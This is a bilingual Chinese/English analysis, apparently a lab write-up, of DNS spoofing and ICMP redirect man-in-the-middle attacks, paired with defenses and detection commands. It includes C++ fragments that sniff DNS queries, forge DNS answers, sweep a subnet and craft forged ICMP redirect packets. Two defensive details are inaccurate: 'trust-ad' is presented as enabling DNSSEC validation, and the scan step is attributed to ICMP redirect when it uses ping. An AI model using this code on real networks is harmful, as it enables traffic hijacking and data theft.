# Attack Methods Analysis - MITM and Pharming Attacks

## DNS Spoofing Attack Analysis (DNS 欺騙攻擊分析)

### 攻擊原理 (Attack Principle)

DNS Spoofing 是一種網路攻擊技術，攻擊者偽造 DNS 回應封包，將合法的域名解析重定向到惡意的 IP 地址。這種攻擊利用了 DNS 協定的信任機制和缺乏加密驗證的弱點。

### 技術實現 (Technical Implementation)

#### 1. 封包攔截機制
```cpp
SnifferConfiguration config;
config.set_promisc_mode(true);        // 啟用混雜模式
config.set_immediate_mode(true);      // 立即模式
config.set_filter("udp and dst port 53");  // 只攔截 DNS 查詢

Sniffer sniffer(interface_name, config);
sniffer.sniff_loop(handle_packet);
```

**功能說明**:
- **混雜模式**: 讓網卡接收所有經過的封包，不僅限於發送給本機的封包
- **立即模式**: 減少封包處理延遲
- **過濾器**: 只處理目標 port 53 (DNS) 的 UDP 封包

#### 2. DNS 查詢解析
```cpp
bool handle_packet(const PDU& pdu) {
    const EthernetII& eth = pdu.rfind_pdu<EthernetII>();
    const IP& ip = eth.rfind_pdu<IP>();
    const UDP& udp = ip.rfind_pdu<UDP>();
    
    if (udp.dport() != 53) return true;  // 只處理 DNS 查詢
    
    const DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();
    
    if (dns.type() != DNS::QUERY || dns.queries().empty()) {
        return true;
    }
    
    for (const auto& query : dns.queries()) {
        if (query.dname() == target_domain && query.query_type() == DNS::A) {
            return spoof_dns_response(eth, ip, udp, dns, query);
        }
    }
}
```

**解析過程**:
1. **封包解構**: 從 Ethernet 封包中提取 IP、UDP 和 DNS 層
2. **查詢驗證**: 確認是 DNS 查詢且包含查詢記錄
3. **域名匹配**: 檢查查詢的域名是否為攻擊目標
4. **類型檢查**: 只處理 A 記錄查詢 (IPv4 地址)

#### 3. 偽造 DNS 回應
```cpp
bool spoof_dns_response(const EthernetII& eth, const IP& ip, const UDP& udp, const DNS& dns, const DNS::query& query) {
    DNS spoofed_dns;
    spoofed_dns.id(dns.id());                    // 保持原始查詢 ID
    spoofed_dns.type(DNS::RESPONSE);             // 設定為回應類型
    spoofed_dns.recursion_desired(dns.recursion_desired());
    spoofed_dns.recursion_available(true);       // 聲稱支援遞歸查詢
    spoofed_dns.add_query(query);                // 添加原始查詢
    
    // 建立偽造的 A 記錄
    DNS::resource answer;
    answer.dname(target_domain);                 // 目標域名
    answer.query_type(DNS::A);                   // A 記錄類型
    answer.query_class(query.query_class());     // 查詢類別
    answer.ttl(300);                            // TTL 300 秒
    answer.data(spoofed_ip.to_string());        // 偽造的 IP 地址
    
    spoofed_dns.add_answer(answer);
    
    // 重建封包
    EthernetII response_eth(eth.src_addr(), eth.dst_addr());
    IP response_ip(ip.src_addr(), ip.dst_addr());
    UDP response_udp(udp.sport(), udp.dport());
    
    auto packet = response_eth / response_ip / response_udp / spoofed_dns;
    sender.send(packet);
}
```

**偽造要點**:
- **ID 匹配**: 使用原始查詢的 ID 確保回應被接受
- **查詢複製**: 完整複製原始查詢記錄
- **回應標記**: 設定適當的 DNS 回應標記
- **TTL 設定**: 設定合理的快取時間

### 攻擊成功條件 (Attack Success Conditions)

1. **網路位置**: 攻擊者與受害者在同一網段
2. **封包攔截**: 能夠攔截受害者的 DNS 查詢
3. **回應速度**: 偽造回應比合法 DNS 伺服器更快
4. **封包格式**: 偽造封包格式正確且符合 RFC 標準

### 防護機制 (Defense Mechanisms)

#### 1. DNSSEC (DNS Security Extensions)
```bash
# 啟用 DNSSEC 驗證
echo "options edns0" >> /etc/resolv.conf
echo "options trust-ad" >> /etc/resolv.conf
```

**防護原理**:
- 使用數位簽章驗證 DNS 回應
- 防止回應被篡改
- 提供資料完整性保護

#### 2. DNS over HTTPS (DoH)
```javascript
// 使用 DoH 進行 DNS 查詢
const dohUrl = 'https://cloudflare-dns.com/dns-query';
const query = 'https://cloudflare-dns.com/dns-query?name=example.com&type=A';
```

**防護原理**:
- 使用 HTTPS 加密 DNS 查詢
- 防止中間人攔截
- 提供端到端加密

#### 3. 本地 DNS 快取
```bash
# 使用可信的本地 DNS 伺服器
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 1.1.1.1" >> /etc/resolv.conf
```

## ICMP Redirect Attack Analysis (ICMP 重定向攻擊分析)

### 攻擊原理 (Attack Principle)

ICMP Redirect 攻擊利用 ICMP 重定向訊息來改變受害者的路由表，將流量重定向到攻擊者控制的伺服器。這種攻擊利用了主機對 ICMP 重定向訊息的信任機制。

### 技術實現 (Technical Implementation)

#### 1. 網路發現機制
```cpp
void go_ping_all(string iface_name) {
    // 獲取網路介面資訊
    string command = "ip addr show " + iface_name;
    string buffer = execCommand(command.c_str());
    
    // 解析 IP 地址和子網路遮罩
    int ip_start = buffer.find("inet ") + 5;
    int ip_end = buffer.find("/", ip_start);
    int mask_end = buffer.find(" ", ip_end);
    
    string ip_str = buffer.substr(ip_start, ip_end - ip_start);
    string mask_str = buffer.substr(ip_end + 1, mask_end - (ip_end + 1));
    
    // 計算網路地址
    struct in_addr addr;
    inet_aton(ip_str.c_str(), &addr);
    int mask = atoi(mask_str.c_str());
    addr.s_addr = (addr.s_addr << (32 - mask)) >> (32 - mask);
    
    // 掃描網段內所有 IP
    int n = 1 << (32 - mask);
    for (int i = 0; i < n; ++i) {
        command = "ping -c 1 -i 0.01 " + current_ip + " > /dev/null 2>&1 &";
        system(command.c_str());
        
        // 遞增 IP 地址
        addr.s_addr = htonl(addr.s_addr);
        addr.s_addr++;
        addr.s_addr = ntohl(addr.s_addr);
        current_ip = string(inet_ntoa(addr));
    }
}
```

**掃描過程**:
1. **介面資訊獲取**: 從系統獲取網路介面 IP 和子網路遮罩
2. **網路計算**: 計算網段範圍
3. **並行掃描**: 使用 ping 命令掃描所有可能的 IP 地址
4. **結果收集**: 收集活躍的設備資訊

#### 2. ARP 表解析
```cpp
void print_arp_table(string iface_name) {
    ifstream arp_file("/proc/net/arp");
    string line;
    getline(arp_file, line); // 跳過標題行
    
    while (getline(arp_file, line)) {
        istringstream iss(line);
        string ip, hw_type, flags, mac, mask, device;
        iss >> ip >> hw_type >> flags >> mac >> mask >> device;
        
        if (device == iface_name && mac != "00:00:00:00:00:00") {
            cout << "[+] " << ip << " is at " << mac << endl;
            devices.push_back({ip, mac});
        }
    }
}
```

**解析要點**:
- **檔案讀取**: 從 `/proc/net/arp` 讀取系統 ARP 表
- **介面過濾**: 只處理指定介面的 ARP 條目
- **MAC 驗證**: 過濾無效的 MAC 地址
- **設備列表**: 建立活躍設備列表供選擇

#### 3. ICMP 重定向封包構造
```cpp
void send_icmp_redirect(const std::string& iface_name,
                        const std::string& victim_ip_str,
                        const std::string& victim_mac_str,
                        const std::string& gateway_ip_str,
                        const IPv4Address& attacker_ip,
                        const HWAddress<6>& attacker_mac,
                        const std::string& target_ip_str) {
    
    IPv4Address victim_ip(victim_ip_str);
    HWAddress<6> victim_mac(victim_mac_str);
    IPv4Address gateway_ip(gateway_ip_str);
    IPv4Address target_ip(target_ip_str);
    
    // 建立偽造的內部 IP 封包 (原始封包的模擬)
    IP inner_ip(target_ip, victim_ip);  // src = target, dst = victim
    inner_ip.ttl(64);
    inner_ip.id(0);
    inner_ip.flags(IP::Flags(0));
    inner_ip.protocol(1);  // ICMP 協定
    
    // 建立 ICMP Echo 回應作為負載
    ICMP echo(ICMP::ECHO_REPLY);
    echo.id(0);
    echo.sequence(0);
    
    // 序列化偽造的原始資料包
    IP inner_packet = inner_ip / echo;
    std::vector<uint8_t> inner_bytes = inner_packet.serialize();
    
    // 建立 ICMP 重定向訊息
    RawPDU inner_raw(inner_bytes);
    ICMP redirect(ICMP::REDIRECT);
    redirect.code(1);  // Code 1 = Host redirect
    redirect.gateway(attacker_ip);  // 重定向到攻擊者 IP
    redirect.inner_pdu(inner_raw);
    
    // 包裝外層 IP 和 Ethernet
    IP ip_outer(victim_ip, gateway_ip);  // dst = victim, src = gateway
    ip_outer.protocol(1);  // ICMP 協定
    
    EthernetII eth(victim_mac, attacker_mac);
    eth.payload_type(EthernetII::IP);
    
    auto packet = eth / ip_outer / redirect;
    sender.send(packet, iface);
}
```

**封包構造要點**:
- **內部封包**: 模擬受害者要發送的原始封包
- **重定向碼**: 使用 Code 1 (Host redirect) 表示主機重定向
- **網關設定**: 將重定向目標設定為攻擊者 IP
- **封包包裝**: 使用正確的 Ethernet 和 IP 標頭

### ICMP 重定向協定分析

#### RFC 792 規範
```
ICMP Redirect Message Format:
    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |     Type      |     Code      |          Checksum             |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                 Gateway Internet Address                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |      Internet Header + 64 bits of Original Data Datagram     |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**欄位說明**:
- **Type**: 5 (Redirect)
- **Code**: 0=Network redirect, 1=Host redirect, 2=TOS and Network redirect, 3=TOS and Host redirect
- **Gateway**: 建議的新網關地址
- **Internet Header**: 原始封包的 IP 標頭
- **Original Data**: 原始封包的前 64 位元組

### 攻擊成功條件 (Attack Success Conditions)

1. **網路位置**: 攻擊者與受害者在同一網段
2. **重定向接受**: 受害者系統接受 ICMP 重定向
3. **封包格式**: 重定向封包格式符合 RFC 標準
4. **時機控制**: 在受害者發送流量前發送重定向

### 防護機制 (Defense Mechanisms)

#### 1. 禁用 ICMP 重定向
```bash
# 禁用所有介面的 ICMP 重定向接受
echo 0 | sudo tee /proc/sys/net/ipv4/conf/*/accept_redirects

# 禁用特定介面
echo 0 | sudo tee /proc/sys/net/ipv4/conf/eth0/accept_redirects
```

#### 2. 靜態路由設定
```bash
# 設定靜態路由防止重定向
ip route add 192.168.1.0/24 via 192.168.1.1 dev eth0
ip route add default via 192.168.1.1 dev eth0
```

#### 3. 防火牆規則
```bash
# 阻擋 ICMP 重定向封包
iptables -A INPUT -p icmp --icmp-type redirect -j DROP
iptables -A FORWARD -p icmp --icmp-type redirect -j DROP
```

#### 4. 網路監控
```bash
# 監控 ICMP 重定向封包
tcpdump -i any icmp and icmp[0] == 5
```

## 攻擊組合分析 (Combined Attack Analysis)

### 攻擊鏈 (Attack Chain)

1. **網路偵察**: 使用 ICMP redirect 掃描網段
2. **目標選擇**: 選擇合適的受害者
3. **DNS 劫持**: 使用 DNS spoofing 重定向域名解析
4. **流量劫持**: 使用 ICMP redirect 劫持流量
5. **中間人攻擊**: 在受害者與目標之間建立代理

### 攻擊效果 (Attack Effects)

1. **完全控制**: 攻擊者可以完全控制受害者的網路流量
2. **透明代理**: 受害者無法察覺被攻擊
3. **資料竊取**: 可以竊取所有未加密的資料
4. **服務偽造**: 可以偽造任何網路服務

### 檢測方法 (Detection Methods)

#### 1. DNS 監控
```bash
# 監控 DNS 查詢和回應
tcpdump -i any port 53
```

#### 2. ICMP 監控
```bash
# 監控 ICMP 重定向封包
tcpdump -i any icmp and icmp[0] == 5
```

#### 3. 路由表監控
```bash
# 監控路由表變化
watch -n 1 "ip route show"
```

#### 4. 流量分析
```bash
# 分析異常的網路流量模式
netstat -i
iftop
```

## 結論 (Conclusion)

DNS Spoofing 和 ICMP Redirect 攻擊都是利用網路協定弱點的攻擊技術。這些攻擊可以組合使用，形成強大的中間人攻擊能力。防護這些攻擊需要：

1. **協定層防護**: 使用加密和驗證機制
2. **網路層防護**: 禁用不必要的協定功能
3. **監控和檢測**: 部署網路監控系統
4. **用戶教育**: 提高安全意識和最佳實踐

理解這些攻擊技術有助於開發更好的防護機制和進行有效的安全測試。
